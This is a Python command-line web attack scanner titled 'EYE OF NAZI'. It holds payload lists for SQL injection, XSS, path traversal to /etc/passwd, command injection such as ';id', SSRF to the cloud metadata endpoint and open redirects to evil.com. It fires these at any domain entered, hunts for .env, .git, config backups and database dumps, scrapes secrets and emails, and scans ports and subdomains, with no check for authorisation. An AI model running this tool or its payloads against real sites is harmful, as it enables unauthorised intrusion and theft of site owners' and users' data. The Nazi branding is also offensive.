
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# EYE OF NAZI v47.0 - FINAL EDITION
# Made by Cyber Kurd Team

import sys, os, re, ssl, time, json, socket
import urllib.parse, urllib.request, urllib.error
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

LOGO = r"""
\033[91m\033[1m
   ███████╗██╗   ██╗███████╗     ██████╗ ███████╗     ███╗   ██╗ █████╗ ███████╗██╗
   ██╔════╝╚██╗ ██╔╝██╔════╝    ██╔═══██╗██╔════╝     ████╗  ██║██╔══██╗╚══███╔╝██║
   █████╗   ╚████╔╝ █████╗      ██║   ██║█████╗       ██╔██╗ ██║███████║  ███╔╝ ██║
   ██╔══╝    ╚██╔╝  ██╔══╝      ██║   ██║██╔══╝       ██║╚██╗██║██╔══██║ ███╔╝  ██║
   ███████╗   ██║   ███████╗    ╚██████╔╝██║          ██║ ╚████║██║  ██║███████╗██║
   ╚══════╝   ╚═╝   ╚══════╝     ╚═════╝ ╚═╝          ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝
\033[0m\033[93m\033[1m                    EYE OF NAZI
\033[96m=============================================================\033[0m
\033[97m\033[1m              FINAL EDITION v47.0\033[0m
\033[2m              Made by Cyber Kurd Team\033[0m
\033[96m=============================================================\033[0m
"""

PAYLOADS = {
    'sqli': ["'", "\"", "'--", "1' OR '1'='1", "1' OR 1=1--",
             "1' AND 1=1--", "1' AND 1=2--", "admin'--",
             "' UNION SELECT NULL--", "1' ORDER BY 100--",
             "1' AND SLEEP(3)--"],
    'xss': ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>", "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>"],
    'lfi': ["../../../../../../etc/passwd", "../../../../../../etc/hosts",
            "../../../../../../windows/win.ini", "/etc/passwd",
            "....//....//....//etc/passwd", "..%2f..%2f..%2fetc%2fpasswd"],
    'rce': [";id", "|id", "&&id", "$(id)", ";whoami", "|whoami",
            ";uname -a", ";ls -la"],
    'ssrf': ["http://127.0.0.1", "http://localhost",
             "http://169.254.169.254/latest/meta-data/",
             "file:///etc/passwd", "http://[::1]"],
    'redir': ["http://evil.com", "//evil.com", "///evil.com"],
    'crlf': ["%0d%0aInjected-Header:yes", "%0aInjected-Header:yes"],
}

SUBDOMAINS = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test',
              'blog', 'shop', 'forum', 'cdn', 'static', 'app',
              'portal', 'vpn', 'git', 'webmail', 'secure', 'login']

PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995,
         1433, 3306, 3389, 5432, 6379, 8080, 8443, 27017, 9200]

HTTP_METHODS = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH', 'HEAD', 'TRACE']

SQL_ERR = ["sql syntax", "warning: mysql", "unclosed quotation",
           "quoted string not properly terminated", "odbc sql server",
           "sqlite3.operationalerror", "postgresql", "mariadb", "sqlstate"]

LFI_IND = ["root:x:0:0", "daemon:x:", "www-data:", "[extensions]"]
RCE_IND = ["uid=", "gid=", "www-data", "GNU/Linux"]
SSRF_IND = ["root:x:0:0", "ami-id", "meta-data", "redis_version"]

SEC_HDRS = ['Strict-Transport-Security', 'X-Frame-Options',
            'X-Content-Type-Options', 'Content-Security-Policy']

PATHS = [
    '.env', '.env.local', '.env.production',
    'wp-config.php.bak', 'wp-config.php~', 'wp-config.php.old',
    'config.php.bak', 'config.json', '.htaccess', '.htpasswd',
    'web.config', '.git/config', '.git/HEAD',
    'backup.zip', 'backup.tar.gz', 'backup.sql', 'www.zip',
    'db.sql', 'database.sql', 'dump.sql',
    'admin', 'admin/', 'admin.php', 'administrator', 'admin/login',
    'wp-admin/', 'wp-login.php', 'phpmyadmin', 'pma', 'cpanel', 'webmail',
    'phpinfo.php', 'info.php', 'test.php', 'server-status',
    'robots.txt', 'sitemap.xml', 'security.txt',
    'error.log', 'access.log', 'logs/',
    'wp-json/', 'wp-json/wp/v2/users', 'xmlrpc.php', 'readme.html',
    'api/', 'api/v1/', 'api/v2/', 'rest/', 'graphql', 'swagger.json',
    'uploads/', 'files/', 'downloads/', 'tmp/',
    'install/', 'setup/', 'db.php', 'database.php',
    'README.md', 'package.json', 'composer.json', 'Dockerfile',
]

BACKUP_FILES = [
    'backup.zip', 'backup.tar.gz', 'backup.sql', 'www.zip',
    'site.zip', 'db.sql', 'database.sql', 'dump.sql',
    'backup-2024.zip', 'old.zip', 'site_backup.zip',
]

SECRET_PATTERNS = [
    r'api[_-]?key["\']?\s*[:=]\s*["\']([a-zA-Z0-9_\-]{20,})["\']',
    r'secret["\']?\s*[:=]\s*["\']([a-zA-Z0-9_\-]{20,})["\']',
    r'AKIA[0-9A-Z]{16}',
]

KNOWN_CVES = {
    'WordPress': {'5.0': ['CVE-2019-8942'], '5.4': ['CVE-2020-4046'],
                  '5.6': ['CVE-2021-29447'], '6.0': ['CVE-2022-21661']},
    'Drupal': {'7': ['CVE-2018-7600'], '8': ['CVE-2019-6340']},
}


class Client:
    def __init__(self, timeout=10, cookie=None, proxy=None):
        self.timeout = timeout
        self.cookie = cookie
        self.proxy = proxy
        self.ua = "Mozilla/5.0 (Linux; Android 14) Chrome/120.0 Mobile"

    def req(self, url, data=None, method=None):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        if self.proxy:
            h = urllib.request.ProxyHandler({'http': self.proxy, 'https': self.proxy})
            op = urllib.request.build_opener(h, urllib.request.HTTPSHandler(context=ctx))
        else:
            op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
        hdrs = {'User-Agent': self.ua, 'Accept': '*/*', 'Connection': 'close'}
        if self.cookie:
            hdrs['Cookie'] = self.cookie
        r = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        t0 = time.time()
        try:
            rp = op.open(r, timeout=self.timeout)
            body = rp.read()
            return {'s': rp.getcode(), 'h': dict(rp.headers),
                    't': body.decode('utf-8', 'ignore'), 'n': len(body),
                    'dt': time.time() - t0, 'err': None}
        except urllib.error.HTTPError as e:
            try:
                body = e.read()
            except Exception:
                body = b''
            return {'s': e.code, 'h': dict(e.headers) if e.headers else {},
                    't': body.decode('utf-8', 'ignore'), 'n': len(body),
                    'dt': time.time() - t0, 'err': None}
        except Exception as e:
            return {'s': 0, 'h': {}, 't': '', 'n': 0,
                    'dt': time.time() - t0, 'err': str(e)}


class Scan:
    def __init__(self, url, cl, threads=30):
        self.url = url.rstrip('/')
        self.cl = cl
        self.threads = threads
        self.f = []
        self.nt = 0
        self.np = 0
        self.npath = 0
        self.techs = []
        self.waf = []
        self.crawled = set()
        self.emails = set()
        self.secrets = []
        self.cves = []

    def add(self, u, p, t, pl, ev, sev):
        self.f.append({'url': u, 'param': p, 'type': t, 'payload': pl,
                       'evidence': ev[:200] if ev else '', 'severity': sev})
        icons = {'SQLI': '\033[41m\033[97m[SQLi]\033[0m',
                 'XSS': '\033[43m[XSS]\033[0m',
                 'LFI': '\033[95m[LFI]\033[0m',
                 'RCE': '\033[41m\033[97m[RCE]\033[0m',
                 'SSRF': '\033[94m[SSRF]\033[0m',
                 'REDIR': '\033[96m[REDIR]\033[0m',
                 'CRLF': '\033[93m[CRLF]\033[0m',
                 'HEADER': '\033[2m[HDR]\033[0m',
                 'PATH': '\033[92m[PATH]\033[0m',
                 'PORT': '\033[93m[PORT]\033[0m',
                 'SUB': '\033[94m[SUB]\033[0m',
                 'SSL': '\033[95m[SSL]\033[0m',
                 'HTTP': '\033[96m[HTTP]\033[0m',
                 'CVE': '\033[41m\033[97m[CVE]\033[0m',
                 'SECRET': '\033[41m\033[97m[SEC]\033[0m',
                 'EMAIL': '\033[94m[MAIL]\033[0m'}
        icon = icons.get(t, '[' + t + ']')
        print("\n  " + icon + " \033[1m" + sev + "\033[0m")
        print("    URL    : " + u[:120])
        if p:
            print("    Param  : \033[93m" + p + "\033[0m")
        if pl:
            print("    Payload: " + pl[:80])
        if ev:
            print("    Proof  : " + ev[:200])

    def inject(self, url, p, pl):
        pr = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(pr.query, keep_blank_values=True)
        qs[p] = [pl]
        return urllib.parse.urlunparse((pr.scheme, pr.netloc, pr.path,
                                         pr.params,
                                         urllib.parse.urlencode(qs, doseq=True),
                                         pr.fragment))

    def params(self, url):
        q = urllib.parse.urlparse(url).query
        return list(urllib.parse.parse_qs(q, keep_blank_values=True).keys()) if q else []

    def scan_url(self, url):
        for p in self.params(url):
            self.np += 1
            print("  \033[2m->\033[0m \033[93m" + p + "\033[0m @ " + url[:65])
            base = self.cl.req(url)
            b = base['t'] if not base['err'] else ''
            for pl in PAYLOADS['sqli']:
                r = self.cl.req(self.inject(url, p, pl))
                if r['err']:
                    continue
                hit = False
                for err in SQL_ERR:
                    if err in r['t'].lower():
                        self.add(url, p, 'SQLI', pl, "DB err: " + err, "CRITICAL")
                        hit = True
                        break
                if hit:
                    break
            for pl in PAYLOADS['xss']:
                r = self.cl.req(self.inject(url, p, pl))
                if r['err']:
                    continue
                if pl in r['t']:
                    self.add(url, p, 'XSS', pl, "Reflected", "HIGH")
                    break
            for pl in PAYLOADS['lfi']:
                r = self.cl.req(self.inject(url, p, pl))
                if r['err']:
                    continue
                hit = False
                for ind in LFI_IND:
                    if ind in r['t'] and ind not in b:
                        self.add(url, p, 'LFI', pl, "Leak: " + ind, "CRITICAL")
                        hit = True
                        break
                if hit:
                    break
            for pl in PAYLOADS['rce']:
                r = self.cl.req(self.inject(url, p, pl))
                if r['err']:
                    continue
                hit = False
                for ind in RCE_IND:
                    if ind in r['t'] and ind not in b:
                        self.add(url, p, 'RCE', pl, "Output: " + ind, "CRITICAL")
                        hit = True
                        break
                if hit:
                    break
            for pl in PAYLOADS['ssrf']:
                r = self.cl.req(self.inject(url, p, pl))
                if r['err']:
                    continue
                hit = False
                for ind in SSRF_IND:
                    if ind in r['t'] and ind not in b:
                        self.add(url, p, 'SSRF', pl, "Leak: " + ind, "CRITICAL")
                        hit = True
                        break
                if hit:
                    break

    def check_headers(self, url):
        r = self.cl.req(url)
        if r['err']:
            return
        missing = [h for h in SEC_HDRS
                   if not any(h.lower() == k.lower() for k in r['h'])]
        if missing:
            self.add(url, '', 'HEADER', '', "Missing: " + ", ".join(missing), "LOW")

    def fingerprint(self, url):
        r = self.cl.req(url)
        if r['err']:
            return []
        det = set()
        text_low = r['t'].lower()
        hdr_str = str(r['h']).lower()
        techs = {
            'WordPress': ['wp-content', 'wp-includes'],
            'Drupal': ['drupal'],
            'Joomla': ['joomla'],
            'PHP': ['PHPSESSID'],
            'nginx': ['nginx'],
            'Apache': ['Apache'],
            'Cloudflare': ['cloudflare', 'cf-ray'],
            'React': ['react'],
            'jQuery': ['jquery'],
            'LiteSpeed': ['litespeed'],
        }
        for tech, signs in techs.items():
            for s in signs:
                if s.lower() in text_low or s.lower() in hdr_str:
                    det.add(tech)
                    break
        return sorted(det)

    def detect_waf(self, url):
        test_url = url.rstrip('/') + '/?x=' + urllib.parse.quote("' OR 1=1--<script>alert(1)</script>")
        r = self.cl.req(test_url)
        if r['err']:
            return []
        h_low = str(r['h']).lower()
        b_low = r['t'].lower()
        det = []
        wafs = {
            'Cloudflare': ['cf-ray', 'cloudflare'],
            'AWS WAF': ['x-amzn-requestid'],
            'Sucuri': ['x-sucuri-id'],
            'ModSecurity': ['mod_security'],
            'Wordfence': ['wordfence'],
        }
        for waf, signs in wafs.items():
            for s in signs:
                if s in h_low or s in b_low:
                    det.append(waf)
                    break
        return det

    def check_path(self, base, path):
        url = base.rstrip('/') + '/' + path.lstrip('/')
        r = self.cl.req(url)
        if r['err']:
            return None
        if r['s'] in (200, 301, 302, 401, 403):
            return {'url': url, 's': r['s'], 'n': r['n'], 'path': path}
        return None

    def scan_paths(self, base):
        print("\n\033[96m[*]\033[0m Scanning " + str(len(PATHS)) + " paths...")
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = {ex.submit(self.check_path, base, p): p for p in PATHS}
            for fut in as_completed(futures):
                try:
                    res = fut.result()
                    if res:
                        self.npath += 1
                        if res['s'] == 200:
                            sev = "MEDIUM"
                            high_keys = ['.env', '.git', 'backup', 'wp-config', 'sql']
                            for x in high_keys:
                                if x in res['path']:
                                    sev = "HIGH"
                                    break
                            self.add(res['url'], '', 'PATH', '',
                                     "Status " + str(res['s']) + " - " + str(res['n']) + "B", sev)
                        elif res['s'] in (401, 403):
                            self.add(res['url'], '', 'PATH', '',
                                     "Protected (" + str(res['s']) + ")", "INFO")
                except Exception:
                    pass

    def scan_backups(self, base):
        print("\n\033[96m[*]\033[0m Backup Files (" + str(len(BACKUP_FILES)) + ")...")
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = {ex.submit(self.check_path, base, p): p for p in BACKUP_FILES}
            for fut in as_completed(futures):
                try:
                    res = fut.result()
                    if res and res['s'] == 200:
                        self.add(res['url'], '', 'PATH', '',
                                 "Backup " + str(res['n']) + "B", "CRITICAL")
                except Exception:
                    pass

    def crawl(self, url, depth=1):
        print("\n\033[96m[*]\033[0m Crawling (depth=" + str(depth) + ")...")
        to_visit = [(url, 0)]
        while to_visit:
            cur, d = to_visit.pop(0)
            if cur in self.crawled or d > depth:
                continue
            self.crawled.add(cur)
            r = self.cl.req(cur)
            if r['err'] or not r['t']:
                continue
            if '?' in cur:
                self.scan_url(cur)
            emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', r['t'])
            for email in emails:
                email = email.lower()
                if email not in self.emails and 'example' not in email:
                    self.emails.add(email)
                    self.add(cur, '', 'EMAIL', '', "Email: " + email, "INFO")
            for pat in SECRET_PATTERNS:
                for m in re.finditer(pat, r['t'], re.IGNORECASE):
                    found = m.group(0)[:80]
                    if found not in self.secrets:
                        self.secrets.append(found)
                        self.add(cur, '', 'SECRET', '', "Secret: " + found, "HIGH")
            if d < depth:
                links = re.findall(r'href=["\']([^"\']+)["\']', r['t'], re.IGNORECASE)
                for lk in links:
                    if lk.startswith(('javascript:', '#', 'mailto:')):
                        continue
                    full = urllib.parse.urljoin(cur, lk)
                    try:
                        host = urllib.parse.urlparse(self.url).netloc
                        if host in full and full not in self.crawled:
                            to_visit.append((full, d + 1))
                    except Exception:
                        pass
        print("  \033[92m[+]\033[0m Crawled " + str(len(self.crawled)) + " URLs")

    def enum_subdomains(self, domain):
        print("\n\033[96m[*]\033[0m Subdomain Enumeration...")
        found = []

        def check(sub):
            url = "http://" + sub + "." + domain
            r = self.cl.req(url)
            if not r['err'] and r['s'] in (200, 301, 302, 401, 403):
                return {'url': url, 's': r['s']}
            return None

        with ThreadPoolExecutor(max_workers=30) as ex:
            futures = {ex.submit(check, s): s for s in SUBDOMAINS}
            for fut in as_completed(futures):
                try:
                    res = fut.result()
                    if res:
                        found.append(res['url'])
                        self.add(res['url'], '', 'SUB', '',
                                 "Subdomain (" + str(res['s']) + ")", "MEDIUM")
                except Exception:
                    pass
        print("  \033[92m[+]\033[0m Found " + str(len(found)) + " subdomain(s)")

    def scan_ports(self, host):
        print("\n\033[96m[*]\033[0m Port Scanning " + host + "...")
        found = []

        def check_port(p):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                result = s.connect_ex((host, p))
                s.close()
                if result == 0:
                    return p
            except Exception:
                pass
            return None

        with ThreadPoolExecutor(max_workers=50) as ex:
            futures = {ex.submit(check_port, p): p for p in PORTS}
            for fut in as_completed(futures):
                try:
                    res = fut.result()
                    if res:
                        found.append(res)
                        self.add(host + ":" + str(res), '', 'PORT', '',
                                 "Port " + str(res) + " open", "MEDIUM")
                except Exception:
                    pass
        print("  \033[92m[+]\033[0m Found " + str(len(found)) + " open port(s)")

    def check_http_methods(self, url):
        print("\n\033[96m[*]\033[0m HTTP Methods...")
        allowed = []
        for m in HTTP_METHODS:
            try:
                r = self.cl.req(url, method=m)
                if not r['err'] and r['s'] not in (405, 501):
                    allowed.append(m)
                    if m in ('PUT', 'DELETE', 'TRACE'):
                        self.add(url, '', 'HTTP', '',
                                 "Method " + m + " (" + str(r['s']) + ")", "HIGH")
            except Exception:
                pass
        print("  \033[92m[+]\033[0m Allowed: " +
              (", ".join(allowed) if allowed else 'none'))

    def check_ssl(self, url):
        print("\n\033[96m[*]\033[0m SSL/TLS Audit...")
        pr = urllib.parse.urlparse(url)
        if pr.scheme != 'https':
            return
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((pr.hostname, pr.port or 443), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=pr.hostname) as ssock:
                    version = ssock.version()
                    print("  \033[92m[+]\033[0m TLS: " + version)
                    if version in ('TLSv1', 'TLSv1.1', 'SSLv2', 'SSLv3'):
                        self.add(url, '', 'SSL', '',
                                 "Weak TLS: " + version, "HIGH")
        except Exception as e:
            print("  \033[91m[!]\033[0m " + str(e))

    def check_cve(self, url, techs):
        print("\n\033[96m[*]\033[0m CVE Detection...")
        r = self.cl.req(url)
        if r['err']:
            return
        text = r['t'].lower()
        for tech in techs:
            if tech in KNOWN_CVES:
                for version, cves in KNOWN_CVES[tech].items():
                    if version in text:
                        for cve in cves:
                            self.cves.append(cve)
                            self.add(url, '', 'CVE', '',
                                     tech + " " + version + " -> " + cve, "CRITICAL")
        if not self.cves:
            print("  \033[92m[+]\033[0m No known CVEs")

    def save_json(self, filename):
        with open(filename, 'w', encoding='utf-8') as fp:
            json.dump({'target': self.url, 'findings': self.f},
                      fp, indent=2, ensure_ascii=False)
        print("\033[92m[+]\033[0m JSON saved: " + filename)

    def run_all(self):
        print("\n\033[96m" + "=" * 65 + "\033[0m")
        print("\033[1m  [*] TARGET: " + self.url + "\033[0m")
        print("\033[96m" + "=" * 65 + "\033[0m")

        print("\n\033[96m[1/11]\033[0m Security Headers...")
        self.check_headers(self.url)

        print("\n\033[96m[2/11]\033[0m Fingerprinting...")
        techs = self.fingerprint(self.url)
        if techs:
            print("  \033[92m[+]\033[0m " + ", ".join(techs))
            self.techs = techs

        print("\n\033[96m[3/11]\033[0m WAF Detection...")
        waf = self.detect_waf(self.url)
        if waf:
            print("  \033[93m[!]\033[0m WAF: " + ", ".join(waf))
            self.waf = waf

        print("\n\033[96m[4/11]\033[0m URL Parameters...")
        self.nt += 1
        self.scan_url(self.url)

        print("\n\033[96m[5/11]\033[0m Sensitive Paths...")
        self.scan_paths(self.url)

        print("\n\033[96m[6/11]\033[0m Backup Files...")
        try:
            self.scan_backups(self.url)
        except Exception:
            pass

        print("\n\033[96m[7/11]\033[0m Crawling...")
        try:
            self.crawl(self.url, depth=1)
        except Exception:
            pass

        print("\n\033[96m[8/11]\033[0m HTTP Methods...")
        try:
            self.check_http_methods(self.url)
        except Exception:
            pass

        print("\n\033[96m[9/11]\033[0m SSL/TLS...")
        try:
            self.check_ssl(self.url)
        except Exception:
            pass

        host = urllib.parse.urlparse(self.url).hostname
        if host:
            print("\n\033[96m[10/11]\033[0m Subdomains...")
            try:
                self.enum_subdomains(host)
            except Exception:
                pass

            print("\n\033[96m[11/11]\033[0m Ports...")
            try:
                self.scan_ports(host)
            except Exception:
                pass

        print("\n\033[96m[+]\033[0m CVE Detection...")
        try:
            self.check_cve(self.url, self.techs)
        except Exception:
            pass

        print("\n\033[96m" + "=" * 65 + "\033[0m")
        crit = sum(1 for f in self.f if f['severity'] == 'CRITICAL')
        high = sum(1 for f in self.f if f['severity'] == 'HIGH')
        med = sum(1 for f in self.f if f['severity'] == 'MEDIUM')
        print("  Findings: \033[1m\033[91m" + str(len(self.f)) + "\033[0m")
        print("    \033[41m\033[97m CRITICAL \033[0m " + str(crit))
        print("    \033[43m HIGH     \033[0m " + str(high))
        print("    \033[93m MEDIUM   \033[0m " + str(med))
        print("\033[96m" + "=" * 65 + "\033[0m\n")


def is_url(text):
    if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text):
        return True
    if text.startswith(('http://', 'https://')):
        return True
    return False


def main():
    print(LOGO)
    print("\n\033[96m" + "=" * 65 + "\033[0m")
    print("\033[92m  Ready. Type a domain (e.g. kurd4u.com).\033[0m")
    print("\033[96m" + "=" * 65 + "\033[0m\n")

    st = {'cookie': None, 'proxy': None, 'threads': 30, 'last': None}

    while True:
        try:
            line = input("\033[1m\033[92mnazi\033[0m\033[93m@\033[0m"
                         "\033[96mforge\033[0m \033[94m>>\033[0m ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n\033[93m[!] Bye\033[0m")
            break

        if not line:
            continue

        parts = line.split(maxsplit=1)
        cmd = parts[0].lower()
        arg = parts[1].strip() if len(parts) > 1 else ""

        if cmd in ('exit', 'quit', 'q'):
            print("\033[93mBye.\033[0m")
            break
        elif cmd == 'cookie':
            if arg:
                st['cookie'] = arg
                print("\033[92m[+] Cookie set\033[0m")
        elif cmd == 'proxy':
            if arg:
                st['proxy'] = arg
                print("\033[92m[+] Proxy set\033[0m")
        elif cmd == 'threads':
            if arg:
                try:
                    st['threads'] = int(arg)
                    print("\033[92m[+] Threads: " + arg + "\033[0m")
                except Exception:
                    pass
        elif cmd == 'status':
            print("\n  Cookie: " + str(st['cookie']))
            print("  Proxy: " + str(st['proxy']))
            print("  Threads: " + str(st['threads']) + "\n")
        elif cmd == 'clear':
            os.system('clear')
            print(LOGO)
        elif cmd == 'save':
            if st['last']:
                fn = arg or 'report.json'
                st['last'].save_json(fn)
        elif is_url(cmd):
            url = cmd if cmd.startswith(('http://', 'https://')) else 'http://' + cmd
            print("\n\033[93m[?]\033[0m Scanning: \033[1m" + url + "\033[0m")
            conf = input("\033[93m    Start? (y/n): \033[0m").strip().lower()
            if conf not in ('y', 'yes', ''):
                continue
            cl = Client(timeout=10, cookie=st['cookie'], proxy=st['proxy'])
            sc = Scan(url, cl, threads=st['threads'])
            try:
                sc.run_all()
                st['last'] = sc
            except KeyboardInterrupt:
                print("\n\033[93m[!] Stopped\033[0m")
                st['last'] = sc
            except Exception as e:
                print("\n\033[91m[!] Error: " + str(e) + "\033[0m")
        else:
            print("\033[91m[!] Unknown: " + cmd + "\033[0m")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[93m[!] Bye\033[0m")
